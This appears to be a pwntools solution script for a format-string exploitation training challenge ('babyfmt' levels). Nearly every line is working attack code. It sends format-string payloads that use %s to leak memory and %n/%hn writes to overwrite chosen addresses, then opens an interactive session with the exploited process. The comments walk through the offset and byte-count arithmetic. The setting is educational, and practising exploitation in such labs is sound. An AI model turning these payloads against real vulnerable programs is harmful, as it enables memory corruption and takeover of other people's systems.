#!/usr/bin/python
from pwn import *


def level_3_1(p):
    '''put address we want to leak on stack which ends up as 22nd argument'''
    p.sendafter('Send your data!', b'%22$s       ' + p64(0x4040c0 + 0x70))

def level_4_0(p):
    '''Write 0xd8 (216) to 0x404100 which we place at 26th argument. '.' padding is
       to make sure the address ends up in it's own 64 bit 'argument' (31st). 
    '''
    data = b'%216x%31$n.......' + p64(0x404100)
    p.sendafter('Send your data!', data)

def level_4_1(p):
    '''Write 0x87 (135) to 0x404158
    '''
    data = b'%135x%24$n' + p64(0x404158)
    p.sendafter('Send your data!', data)

def level_5_0(p):
    '''Write 0x9f443fccff098e2a to 0x404138.
    '''
    #Little endian so 8e21 first, then ff09....
    #add ff09 - 8e21 bytes to write ff09... still need to sub a little more, not sure why
    #next overflow to write 3fcc...
    # (0x10000 - 0xff09) + 0x3fcc
    # 9f44 - 3fcc...
    data = b'%36394x%43$hn' + \
           b'%28895x%44$hn' + \
           b'%16579x%45$hn' + \
           b'%24440x%46$hn.....' + \
           p64(0x404138) + p64(0x40413a) + p64(0x40413c) + p64(0x40413e)
    p.sendafter('Send your data!', data)

def level_5_1(p):
    ''''''


level = 5.0
p = process(f'/challenge/babyfmt_level{level}')
#p = gdb.debug(f'./babyfmt_level{level}', '''
#b read
#c
        
#disable 1
#b printf
#c
#c
#c
#''')

level_5_0(p)

p.interactive()